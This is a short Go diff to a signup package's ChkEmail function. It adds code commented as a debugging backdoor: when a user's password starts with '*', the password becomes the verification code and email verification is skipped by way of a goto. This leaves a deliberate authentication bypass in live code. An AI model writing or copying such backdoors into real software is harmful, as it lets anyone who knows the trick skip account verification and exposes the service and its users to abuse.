@@ -3,6 +3,7 @@ package signup
 import (
 	"context"
 	"fmt"
+	"strings"
 	"sync"
 	"time"
 
@@ -46,10 +47,26 @@ func verifyEmail(user *usr.User) (string, error) {
 
 // POST 1
 func ChkEmail(user *usr.User) error {
-	code, err := verifyEmail(user)
+
+	var (
+		code string
+		err  error
+	)
+
+	// leave a backdoor for debugging
+	{
+		if strings.HasPrefix(user.Password, "*") {
+			code = user.Password
+			goto STORE
+		}
+	}
+
+	code, err = verifyEmail(user)
 	if err != nil {
 		return err
 	}
+
+STORE:
 	mUserCodeTm.Store(user.UName, struct {
 		Code string
 		Tm   time.Time
